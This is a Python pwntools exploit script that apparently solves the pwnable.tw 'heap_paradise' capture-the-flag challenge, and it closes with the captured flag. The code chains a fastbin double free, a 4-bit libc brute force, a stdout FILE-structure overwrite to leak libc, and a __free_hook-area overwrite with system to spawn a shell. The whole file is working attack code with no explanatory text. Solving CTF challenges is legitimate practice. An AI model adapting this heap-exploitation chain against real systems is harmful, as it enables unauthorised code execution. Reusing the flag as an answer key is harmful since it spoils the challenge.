from pwn import *

elf = ELF("./heap_paradise")
libc = ELF("./libc_64.so.6")
context.binary = elf
flag = 0
while flag == 0:
    r = remote('chall.pwnable.tw', 10308)


    def sla(string, val):
        r.sendlineafter(string, val)


    def sa(string, val):
        r.sendafter(string, val)


    def add(size, data="A"):
        sla("Choice:", str(1))
        sla("Size :", str(size))
        sa("Data :", data)


    def delete(index):
        sla("Choice:", str(2))
        sla("Index :", str(index))


    payload = p64(0) * 3 + p64(0x71)
    add(0x68, payload)  # 0
    payload = p64(0x21) * 13
    add(0x68, payload)  # 1
    payload = p64(0) * 3 + p64(0x21) * 10
    add(0x68, payload)  # 2
    delete(0)
    delete(1)
    delete(0)
    payload = b"\x20"
    add(0x68, payload)  # 3
    add(0x68)  # 4
    add(0x68)  # 5
    payload = p64(0) * 9 + p64(0xa1)
    add(0x68, payload)  # 6
    delete(1)
    delete(6)
    payload = p64(0) * 9 + p64(0x71) + b"\xdd\x25"  # 4 bit libc brute force
    try:
        add(0x68, payload)  # 7
    except:
        r.close()
        continue
    delete(0)
    delete(6)
    delete(0)
    payload = p64(0) * 3 + p64(0x71) + b"\x70"
    add(0x68, payload)  # 8
    add(0x68)  # 9
    add(0x68)  # 10
    payload = b"A" * 0x33 + p32(0xfbad1801) + b";sh\x00" + p64(0) * 3 + b"\x00"
    sleep(5)
    add(0x68, payload)  # 11
    libc_base = u64(r.recv(0x48)[0x40:0x48]) - 0x3c4600
    libc_system = libc_base + libc.symbols["system"]
    if libc_base % 0x1000 == 0:
        flag = 1
    else:
        r.close()
        continue
    delete(1)
    delete(6)
    payload = p64(0) * 9 + p64(0x71) + p64(libc_base + 0x3c46bd)
    add(0x68, payload)  # 12
    add(0x68)  # 13
    payload = b"\x00" * 0x2b + p64(libc_base + 0x3c46c8) + p64(libc_system)
    add(0x68, payload)  # 14

    r.interactive()

# FLAG --> FLAG{W3lc0m3_2_h3ap_p4radis3}
